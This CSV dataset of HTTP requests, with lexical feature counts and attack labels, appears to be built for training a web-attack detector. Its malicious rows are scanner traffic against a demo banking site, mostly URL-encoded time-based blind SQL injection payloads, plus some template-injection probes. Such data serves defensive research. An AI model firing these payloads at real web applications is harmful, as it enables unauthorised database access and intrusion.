method,path,body,single_q,double_q,dashes,braces,spaces,percentages,semicolons,angle_brackets,special_chars,path_length,body_length,badwords_count,class
POST,/doLogin,uid=ZAP&passw=%29%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+&btnSubmit=Login,4,2,1,1,14,0,1,0,0,8,181,5,1
GET,/static/index.jsp?content=%29%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+,,4,2,1,1,14,0,1,0,0,177,0,4,1
GET,/search.jsp?query=%22java.lang.Thread.sleep%22%2815000%29,,0,2,0,1,0,0,0,0,0,49,0,1,1
GET,/Privacypolicy.jsp?sec=Careers&template=%27%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+,,5,2,1,1,14,0,1,0,0,191,0,4,1
GET,/index.jsp?content=inside_jobs.htm%27+and+exists+%28+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27%29+--+&job=MortgageLendingAccountExecutive%3ASales,,5,2,1,2,17,0,0,0,0,240,0,4,1
GET,/images/index.jsp?content=personal.htm%27+and+exists+%28+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27%29+--+,,5,2,1,2,17,0,0,0,0,202,0,4,1
GET,/survey_questions.jsp?step=%29%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+,,4,2,1,1,14,0,1,0,0,178,0,4,1
GET,/index.jsp?content=inside_volunteering.htm%27+and+exists+%28+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27%29+--+,,5,2,1,2,17,0,0,0,0,206,0,4,1
POST,/doSubscribe,txtEmail=ZAP&btnSubmit=%22java.lang.Thread.sleep%22%2815000%29,0,2,0,1,0,0,0,0,0,12,54,1,1
POST,/doLogin,uid=ZAP&passw=%22java.lang.Thread.sleep%22%2815000%29&btnSubmit=Login,0,2,0,1,0,0,0,0,0,8,61,2,1
GET,/static/index.jsp?content=%22java.lang.Thread.sleep%22%2815000%29,,0,2,0,1,0,0,0,0,0,57,0,1,1
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/index.jsp?content=personal_checking.htm%27+%2F+%22java.lang.Thread.sleep%22%2815000%29+%2F+%27,,2,2,0,1,7,0,0,0,0,122,0,1,1
POST,/sendFeedback,cfile=comments.txt&name=%22java.lang.Thread.sleep%22%2815000%29&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,0,2,0,1,7,0,0,0,0,13,152,1,1
GET,/search.jsp?query=ZAP+%2F+%22java.lang.Thread.sleep%22%2815000%29+,,0,2,0,1,3,0,0,0,0,56,0,1,1
GET,/Privacypolicy.jsp?sec=Careers&template=%22%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+,,4,3,1,1,14,0,1,0,0,191,0,4,1
GET,/index.jsp?content=inside_jobs.htm&job=%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+,,4,2,1,1,14,0,1,0,0,189,0,4,1
GET,/survey_questions.jsp?step=%22java.lang.Thread.sleep%22%2815000%29,,0,2,0,1,0,0,0,0,0,58,0,1,1
POST,/doSubscribe,txtEmail=ZAP&btnSubmit=Subscribe+%2F+%22java.lang.Thread.sleep%22%2815000%29+,0,2,0,1,3,0,0,0,0,12,67,1,1
POST,/doLogin,uid=ZAP&passw=ZAP+%2F+%22java.lang.Thread.sleep%22%2815000%29+&btnSubmit=Login,0,2,0,1,3,0,0,0,0,8,68,2,1
GET,/static/index.jsp?content=personal_checking.htm+%2F+%22java.lang.Thread.sleep%22%2815000%29+,,0,2,0,1,3,0,0,0,0,82,0,1,1
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/index.jsp?content=personal_checking.htm%22+%2F+%22java.lang.Thread.sleep%22%2815000%29+%2F+%22,,0,4,0,1,7,0,0,0,0,122,0,1,1
GET,/search.jsp?query=ZAP%27+%2F+%22java.lang.Thread.sleep%22%2815000%29+%2F+%27,,2,2,0,1,4,0,0,0,0,60,0,1,1
POST,/sendFeedback,cfile=comments.txt&name=ZAP+%2F+%22java.lang.Thread.sleep%22%2815000%29+&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,0,2,0,1,10,0,0,0,0,13,159,1,1
GET,/index.jsp?content=inside_jobs.htm&job=%27%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+,,5,2,1,1,14,0,1,0,0,190,0,4,1
GET,/Privacypolicy.jsp?sec=Careers&template=%29%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+,,4,2,1,1,14,0,1,0,0,191,0,4,1
POST,/doSubscribe,txtEmail=ZAP&btnSubmit=Subscribe%27+%2F+%22java.lang.Thread.sleep%22%2815000%29+%2F+%27,2,2,0,1,4,0,0,0,0,12,71,1,1
GET,/static/index.jsp?content=personal_checking.htm%27+%2F+%22java.lang.Thread.sleep%22%2815000%29+%2F+%27,,2,2,0,1,4,0,0,0,0,86,0,1,1
GET,/survey_questions.jsp?step=d+%2F+%22java.lang.Thread.sleep%22%2815000%29+,,0,2,0,1,3,0,0,0,0,63,0,1,1
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/index.jsp?content=personal_checking.htm+and+exists+%28+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27%29+--+,,4,2,1,2,20,0,0,0,0,246,0,4,1
POST,/doLogin,uid=ZAP&passw=ZAP%27+%2F+%22java.lang.Thread.sleep%22%2815000%29+%2F+%27&btnSubmit=Login,2,2,0,1,4,0,0,0,0,8,72,2,1
POST,/sendFeedback,cfile=comments.txt&name=ZAP%27+%2F+%22java.lang.Thread.sleep%22%2815000%29+%2F+%27&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,2,2,0,1,11,0,0,0,0,13,163,1,1
GET,/search.jsp?query=ZAP%22+%2F+%22java.lang.Thread.sleep%22%2815000%29+%2F+%22,,0,4,0,1,4,0,0,0,0,60,0,1,1
GET,/index.jsp?content=inside_jobs.htm&job=%22%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+,,4,3,1,1,14,0,1,0,0,190,0,4,1
GET,/Privacypolicy.jsp?sec=Careers&template=%22java.lang.Thread.sleep%22%2815000%29,,0,2,0,1,0,0,0,0,0,71,0,1,1
POST,/doSubscribe,txtEmail=ZAP&btnSubmit=Subscribe%22+%2F+%22java.lang.Thread.sleep%22%2815000%29+%2F+%22,0,4,0,1,4,0,0,0,0,12,71,1,1
GET,/static/index.jsp?content=personal_checking.htm%22+%2F+%22java.lang.Thread.sleep%22%2815000%29+%2F+%22,,0,4,0,1,4,0,0,0,0,86,0,1,1
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/index.jsp?content=personal_checking.htm%27+and+exists+%28+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27%29+--+,,5,2,1,2,20,0,0,0,0,247,0,4,1
GET,/survey_questions.jsp?step=d%27+%2F+%22java.lang.Thread.sleep%22%2815000%29+%2F+%27,,2,2,0,1,4,0,0,0,0,67,0,1,1
GET,/search.jsp?query=ZAP+and+exists+%28+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27%29+--+,,4,2,1,2,17,0,0,0,0,184,0,4,1
POST,/sendFeedback,cfile=comments.txt&name=ZAP%22+%2F+%22java.lang.Thread.sleep%22%2815000%29+%2F+%22&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,0,4,0,1,11,0,0,0,0,13,163,1,1
POST,/doLogin,uid=ZAP&passw=ZAP%22+%2F+%22java.lang.Thread.sleep%22%2815000%29+%2F+%22&btnSubmit=Login,0,4,0,1,4,0,0,0,0,8,72,2,1
GET,/index.jsp?content=inside_jobs.htm&job=%29%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+,,4,2,1,1,14,0,1,0,0,190,0,4,1
GET,/Privacypolicy.jsp?sec=Careers&template=US+%2F+%22java.lang.Thread.sleep%22%2815000%29+,,0,2,0,1,3,0,0,0,0,77,0,1,1
GET,/static/index.jsp?content=personal_checking.htm+and+exists+%28+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27%29+--+,,4,2,1,2,17,0,0,0,0,210,0,4,1
POST,/doSubscribe,txtEmail=ZAP&btnSubmit=Subscribe+and+exists+%28+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27%29+--+,4,2,1,2,17,0,0,0,0,12,195,4,1
GET,/survey_questions.jsp?step=d%22+%2F+%22java.lang.Thread.sleep%22%2815000%29+%2F+%22,,0,4,0,1,4,0,0,0,0,67,0,1,1
POST,/sendFeedback,cfile=comments.txt&name=ZAP+and+exists+%28+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27%29+--+&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,4,2,1,2,24,0,0,0,0,13,287,4,1
POST,/doLogin,uid=ZAP&passw=ZAP+and+exists+%28+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27%29+--+&btnSubmit=Login,4,2,1,2,17,0,0,0,0,8,196,5,1
GET,/search.jsp?query=ZAP%27+and+exists+%28+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27%29+--+,,5,2,1,2,17,0,0,0,0,185,0,4,1
GET,/index.jsp?content=inside_jobs.htm&job=%22java.lang.Thread.sleep%22%2815000%29,,0,2,0,1,0,0,0,0,0,70,0,1,1
GET,/Privacypolicy.jsp?sec=Careers&template=US%27+%2F+%22java.lang.Thread.sleep%22%2815000%29+%2F+%27,,2,2,0,1,4,0,0,0,0,81,0,1,1
POST,/doSubscribe,txtEmail=ZAP&btnSubmit=Subscribe%27+and+exists+%28+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27%29+--+,5,2,1,2,17,0,0,0,0,12,196,4,1
GET,/static/index.jsp?content=personal_checking.htm%27+and+exists+%28+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27%29+--+,,5,2,1,2,17,0,0,0,0,211,0,4,1
GET,/survey_questions.jsp?step=d+and+exists+%28+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27%29+--+,,4,2,1,2,17,0,0,0,0,191,0,4,1
POST,/sendFeedback,cfile=comments.txt&name=ZAP%27+and+exists+%28+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27%29+--+&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,5,2,1,2,24,0,0,0,0,13,288,4,1
POST,/doLogin,uid=ZAP&passw=ZAP%27+and+exists+%28+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27%29+--+&btnSubmit=Login,5,2,1,2,17,0,0,0,0,8,197,5,1
GET,/Privacypolicy.jsp?sec=Careers&template=US%22+%2F+%22java.lang.Thread.sleep%22%2815000%29+%2F+%22,,0,4,0,1,4,0,0,0,0,81,0,1,1
GET,/index.jsp?content=inside_jobs.htm&job=MortgageLendingAccountExecutive%3ASales+%2F+%22java.lang.Thread.sleep%22%2815000%29+,,0,2,0,1,3,0,0,0,0,111,0,1,1
POST,/doLogin,uid=ZAP&passw=ZAP&btnSubmit=%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+,4,2,1,1,14,0,1,0,0,8,178,5,1
GET,/survey_questions.jsp?step=d%27+and+exists+%28+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27%29+--+,,5,2,1,2,17,0,0,0,0,192,0,4,1
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,4,2,1,1,21,0,1,0,0,13,271,4,1
GET,/Privacypolicy.jsp?sec=Careers&template=US+and+exists+%28+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27%29+--+,,4,2,1,2,17,0,0,0,0,205,0,4,1
GET,/index.jsp?content=inside_jobs.htm&job=MortgageLendingAccountExecutive%3ASales%27+%2F+%22java.lang.Thread.sleep%22%2815000%29+%2F+%27,,2,2,0,1,4,0,0,0,0,115,0,1,1
POST,/doLogin,uid=ZAP&passw=ZAP&btnSubmit=%27%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+,5,2,1,1,14,0,1,0,0,8,179,5,1
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=%27%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,5,2,1,1,21,0,1,0,0,13,272,4,1
GET,/Privacypolicy.jsp?sec=Careers&template=US%27+and+exists+%28+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27%29+--+,,5,2,1,2,17,0,0,0,0,206,0,4,1
GET,/index.jsp?content=inside_jobs.htm&job=MortgageLendingAccountExecutive%3ASales%22+%2F+%22java.lang.Thread.sleep%22%2815000%29+%2F+%22,,0,4,0,1,4,0,0,0,0,115,0,1,1
POST,/doLogin,uid=ZAP&passw=ZAP&btnSubmit=%22%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+,4,3,1,1,14,0,1,0,0,8,179,5,1
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=%22%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,4,3,1,1,21,0,1,0,0,13,272,4,1
GET,/index.jsp?content=inside_jobs.htm&job=MortgageLendingAccountExecutive%3ASales+and+exists+%28+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27%29+--+,,4,2,1,2,17,0,0,0,0,239,0,4,1
POST,/doLogin,uid=ZAP&passw=ZAP&btnSubmit=%29%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+,4,2,1,1,14,0,1,0,0,8,179,5,1
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=%29%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,4,2,1,1,21,0,1,0,0,13,272,4,1
GET,/index.jsp?content=inside_jobs.htm&job=MortgageLendingAccountExecutive%3ASales%27+and+exists+%28+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27%29+--+,,5,2,1,2,17,0,0,0,0,240,0,4,1
GET,/Documents/JohnSmith/index.jsp?content=zj%7B%40math+key%3D%228603%22+method%3D%22multiply%22+operand%3D%222081%22%2F%7Dzj,,0,6,0,0,3,0,0,0,0,95,0,0,1
GET,/Privacypolicy.jsp?sec=zj%7B%40math+key%3D%222386%22+method%3D%22multiply%22+operand%3D%226177%22%2F%7Dzj&template=US,,0,6,0,0,3,0,0,0,0,91,0,0,1
GET,/index.jsp?content=zj%23set%28%24x%3D2869*3931%29%24%7Bx%7Dzj&job=MortgageLendingAccountExecutive%3ASales,,0,0,0,1,0,0,0,0,0,87,0,0,1
GET,/survey_questions.jsp?step=zj%24%7B9049*6417%7Dzj,,0,0,0,0,0,0,0,0,0,43,0,0,1
POST,/doLogin,uid=ZAP&passw=zj%7B4791*4082%7Dzj&btnSubmit=Login,0,0,0,0,0,0,0,0,0,8,45,1,1
POST,/sendFeedback,cfile=comments.txt&name=zj%7B2848*4281%7Dzj&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,0,0,0,0,7,0,0,0,0,13,136,0,1
POST,/doSubscribe,txtEmail=ZAP&btnSubmit=zj%7B9787*8945%7Dzj,0,0,0,0,0,0,0,0,0,12,38,0,1
GET,/static/index.jsp?content=zj%23%7B6192*9766%7Dzj,,0,0,0,0,0,0,0,0,0,42,0,0,1
GET,/index.jsp?content=zj%23set%28%24x%3D9432*9479%29%24%7Bx%7Dzj,,0,0,0,1,0,0,0,0,0,45,0,0,1
GET,/default.jsp?content=zj%7B%40math+key%3D%229072%22+method%3D%22multiply%22+operand%3D%221265%22%2F%7Dzj,,0,6,0,0,3,0,0,0,0,77,0,0,1
GET,/disclaimer.htm?url=zj%7B%40math+key%3D%222579%22+method%3D%22multiply%22+operand%3D%225121%22%2F%7Dzj,,0,6,0,0,3,0,0,0,0,76,0,0,1
GET,/images/index.jsp?content=zj%3Cp+th%3Atext%3D%22%24%7B4206*7594%7D%22%3E%3C%2Fp%3Ezj,,0,2,0,0,1,0,0,4,0,60,0,0,1
GET,/search.jsp?query=zj%7B%402001*5194%7Dzj,,0,0,0,0,0,0,0,0,0,34,0,0,1
GET,/Documents/JohnSmith/index.jsp?content=zj%7B%7B94330%7Cadd%3A67680%7D%7Dzj,,0,0,0,0,0,0,0,0,0,62,0,0,1
GET,/Privacypolicy.jsp?sec=zj%7B%7B49030%7Cadd%3A23380%7D%7Dzj&template=US,,0,0,0,0,0,0,0,0,0,58,0,0,1
GET,/,,0,0,0,0,0,0,0,0,0,1,0,0,0
GET,/robots.txt,,0,0,0,0,0,0,0,0,0,11,0,0,0
GET,/style.css,,0,0,0,0,0,0,0,0,0,10,0,0,0
GET,/images/logo.gif,,0,0,0,0,0,0,0,0,0,16,0,0,0
GET,/images/header_pic.jpg,,0,0,0,0,0,0,0,0,0,22,0,0,0
GET,/images/pf_lock.gif,,0,0,0,0,0,0,0,0,0,19,0,0,0
GET,/index.jsp,,0,0,0,0,0,0,0,0,0,10,0,0,0
GET,/login.jsp,,0,0,0,0,0,0,0,0,0,10,0,0,0
GET,/index.jsp?content=inside_contact.htm,,0,0,0,0,0,0,0,0,0,37,0,0,0
GET,/feedback.jsp,,0,0,0,0,0,0,0,0,0,13,0,0,0
GET,/index.jsp?content=personal.htm,,0,0,0,0,0,0,0,0,0,31,0,0,0
GET,/index.jsp?content=business.htm,,0,0,0,0,0,0,0,0,0,31,0,0,0
GET,/index.jsp?content=inside.htm,,0,0,0,0,0,0,0,0,0,29,0,0,0
GET,/index.jsp?content=personal_deposit.htm,,0,0,0,0,0,0,0,0,0,39,0,0,0
GET,/index.jsp?content=personal_checking.htm,,0,0,0,0,0,0,0,0,0,40,0,0,0
GET,/index.jsp?content=personal_loans.htm,,0,0,0,0,0,0,0,0,0,37,0,0,0
GET,/index.jsp?content=personal_cards.htm,,0,0,0,0,0,0,0,0,0,37,0,0,0
GET,/index.jsp?content=personal_investments.htm,,0,0,0,0,0,0,0,0,0,43,0,0,0
GET,/index.jsp?content=personal_other.htm,,0,0,0,0,0,0,0,0,0,37,0,0,0
GET,/index.jsp?content=business_deposit.htm,,0,0,0,0,0,0,0,0,0,39,0,0,0
GET,/index.jsp?content=business_lending.htm,,0,0,0,0,0,0,0,0,0,39,0,0,0
GET,/index.jsp?content=business_insurance.htm,,0,0,0,0,0,0,0,0,0,41,0,0,0
GET,/index.jsp?content=business_retirement.htm,,0,0,0,0,0,0,0,0,0,42,0,0,0
GET,/index.jsp?content=inside_about.htm,,0,0,0,0,0,0,0,0,0,35,0,0,0
GET,/cgi.exe,,0,0,0,0,0,0,0,0,0,8,0,0,0
GET,/index.jsp?content=inside_investor.htm,,0,0,0,0,0,0,0,0,0,38,0,0,0
GET,/index.jsp?content=inside_press.htm,,0,0,0,0,0,0,0,0,0,35,0,0,0
GET,/index.jsp?content=inside_careers.htm,,0,0,0,0,0,0,0,0,0,37,0,0,0
GET,/subscribe.jsp,,0,0,0,0,0,0,0,0,0,14,0,0,0
GET,/index.jsp?content=personal_savings.htm,,0,0,0,0,0,0,0,0,0,39,0,0,0
GET,/index.jsp?content=privacy.htm,,0,0,0,0,0,0,0,0,0,30,0,0,0
GET,/default.jsp?content=security.htm,,0,0,0,0,0,0,0,0,0,33,0,0,0
GET,/survey_questions.jsp,,0,0,0,0,0,0,0,0,0,21,0,0,0
GET,/index.jsp?content=security.htm,,0,0,0,0,0,0,0,0,0,31,0,0,0
GET,/status_check.jsp,,0,0,0,0,0,0,0,0,0,17,0,0,0
GET,/swagger/index.html,,0,0,0,0,0,0,0,0,0,19,0,0,0
GET,/search.jsp?query=,,0,0,0,0,0,0,0,0,0,18,0,0,0
GET,/search.jsp?query=876143,,0,0,0,0,0,0,0,0,0,24,0,0,0
GET,/index.jsp?content=business_cards.htm,,0,0,0,0,0,0,0,0,0,37,0,0,0
GET,/index.jsp?content=business_other.htm,,0,0,0,0,0,0,0,0,0,37,0,0,0
GET,/index.jsp?content=privacy.htm,,0,0,0,0,0,0,0,0,0,30,0,0,0
GET,/login.jsp,,0,0,0,0,0,0,0,0,0,10,0,0,0
GET,/login.jsp,,0,0,0,0,0,0,0,0,0,10,0,0,0
GET,/index.jsp?content=inside_contact.htm,,0,0,0,0,0,0,0,0,0,37,0,0,0
GET,/disclaimer.htm?url=http%3a%2f%2fwww.netscape.com,,0,0,0,0,0,0,0,0,0,43,0,0,0
GET,/index.jsp?content=inside_contact.htm,,0,0,0,0,0,0,0,0,0,37,0,0,0
GET,/disclaimer.htm?url=http%3a%2f%2fwww.microsoft.com,,0,0,0,0,0,0,0,0,0,44,0,0,0
